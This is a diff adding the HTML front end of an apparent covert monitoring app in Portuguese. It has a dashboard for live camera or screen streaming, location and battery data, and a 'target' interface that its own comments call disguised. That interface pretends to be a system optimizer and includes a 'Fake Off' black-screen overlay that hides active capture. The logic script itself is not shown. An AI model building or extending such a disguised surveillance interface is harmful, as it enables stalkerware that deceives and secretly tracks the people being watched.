@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Utilitário de Sistema</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="manifest" href="manifest.json">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <script src="/socket.io/socket.io.js"></script>
+</head>
+
+<body>
+    <!-- App Container -->
+    <div id="container">
+
+        <!-- Selection Mode -->
+        <div id="role-selection" class="glass-panel">
+            <h1>Painel de Controle</h1>
+            <p>Selecione o modo de operação:</p>
+            <div class="buttons">
+                <button id="btn-parent" class="btn primary">📱 Acessar Monitoramento</button>
+                <button id="btn-child" class="btn secondary">🔧 Configurar Dispositivo</button>
+            </div>
+            <div class="room-box">
+                <input type="text" id="room-input" placeholder="ID de Segurança (ex: FamiliaSilva)"
+                    value="FamiliaSilva">
+            </div>
+        </div>
+
+        <!-- Parent Dashboard -->
+        <div id="parent-dashboard" class="hidden">
+            <header>
+                <h2>Monitoramento em Tempo Real</h2>
+                <div id="target-status" class="status-badge offline">Offline</div>
+            </header>
+
+            <div class="grid">
+                <!-- Video/Screen Card -->
+                <div class="card glass">
+                    <div class="card-header">
+                        <span>Fluxo de Vídeo/Tela</span>
+                        <div class="controls">
+                            <button id="cmd-camera" class="btn-icon">📷</button>
+                            <button id="cmd-screen" class="btn-icon">🖥️</button>
+                        </div>
+                    </div>
+                    <div class="video-wrapper">
+                        <video id="remote-video" autoplay playsinline></video>
+                        <div id="video-placeholder">Sem sinal ativo</div>
+                    </div>
+                </div>
+
+                <!-- Info Card -->
+                <div class="card glass">
+                    <div class="card-header">Informações do Dispositivo</div>
+                    <div class="info-list">
+                        <div class="info-item">
+                            <span class="label">📍 Localização:</span>
+                            <span id="data-location">Aguardando...</span>
+                        </div>
+                        <div class="info-item">
+                            <span class="label">🔋 Bateria:</span>
+                            <span id="data-battery">--%</span>
+                        </div>
+                        <div class="info-item">
+                            <span class="label">📶 Rede:</span>
+                            <span id="data-network">--</span>
+                        </div>
+                    </div>
+                    <div id="map-preview">
+                        <!-- Placeholder for Map -->
+                        <div class="map-placeholder">Clique para ver no Google Maps</div>
+                    </div>
+                </div>
+            </div>
+            <button id="exit-parent" class="btn danger">Sair do Painel</button>
+        </div>
+
+        <!-- Child/Target Interface (Disguised) -->
+        <div id="child-interface" class="hidden">
+            <div id="setup-view" class="glass-panel">
+                <h2>Configuração de Sistema</h2>
+                <p>Otimizando parâmetros de bateria e rede...</p>
+                <div class="progress-bar">
+                    <div class="fill"></div>
+                </div>
+                <button id="start-target" class="btn primary">Iniciar Serviço</button>
+            </div>
+
+            <!-- The "Fake Off" Overlay -->
+            <div id="fake-off-overlay" class="hidden">
+                <div class="black-screen"></div>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- Scripts -->
+    <script src="app.js"></script>
+</body>
+
+</html>
